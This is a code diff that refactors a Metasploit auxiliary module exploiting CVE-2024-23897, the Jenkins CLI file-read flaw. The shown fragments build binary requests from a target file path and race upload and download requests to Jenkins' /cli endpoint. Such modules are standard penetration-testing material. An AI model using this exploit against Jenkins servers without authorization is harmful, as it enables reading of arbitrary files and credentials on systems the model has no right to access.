@@ -92,31 +92,10 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # Returns the Jenkins version. taken from jenkins_cred_recovery.rb, upgraded to work with newer versions
-  #
-  # @return [String] Jenkins version.
-  # @return [NilClass] No Jenkins version found.
-  def get_jenkins_version
-    uri = normalize_uri(target_uri.path)
-    res = send_request_cgi({ 'uri' => uri })
-
-    unless res
-      fail_with(Failure::Unknown, 'Connection timed out while finding the Jenkins version')
-    end
-
-    # shortcut for new versions such as 2.426.2 and 2.440
-    return res.headers['X-Jenkins'] if res.headers['X-Jenkins']
-
-    html = res.get_html_document
-    version_attribute = html.at('body').attributes['data-version']
-    version = version_attribute ? version_attribute.value : ''
-    version.scan(/jenkins-([\d.]+)/).flatten.first
-  end
-
   def check
-    version = get_jenkins_version
+    version = jenkins_version
 
-    return Exploit::CheckCode::Safe('Unable to determine Jenkins version number') if version.nil? || version.blank?
+    return Exploit::CheckCode::Safe('Unable to determine Jenkins version number') if version.blank?
 
     version = Rex::Version.new(version)
 
@@ -152,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
   def data_generator(pad: false)
     data = []
     data << request_header
-    data << parameter_one if pad == true
+    data << parameter_one if pad
     data << [datastore['FILE_PATH'].length + 3].pack('C').to_s
     data << "\x00\x00"
     data << [datastore['FILE_PATH'].length + 1].pack('C').to_s
@@ -167,7 +146,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
     # which is required for successful exploitation
-    Rex::ThreadSafe.sleep(datastore['DELAY'])
+    sleep(datastore['DELAY'])
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'cli'),
       'method' => 'POST',
@@ -277,10 +256,10 @@ class MetasploitModule < Msf::Auxiliary
       print_status('Re-attempting with padding for single line output file')
       use_pad = true
       threads = []
-      threads << framework.threads.spawn('CVE-2024-23897', false) do
+      threads << framework.threads.spawn('CVE-2024-23897-upload', false) do
         upload_request(uuid, use_pad)
       end
-      threads << framework.threads.spawn('CVE-2024-23897', false) do
+      threads << framework.threads.spawn('CVE-2024-23897-download', false) do
         download_request(uuid)
       end
 
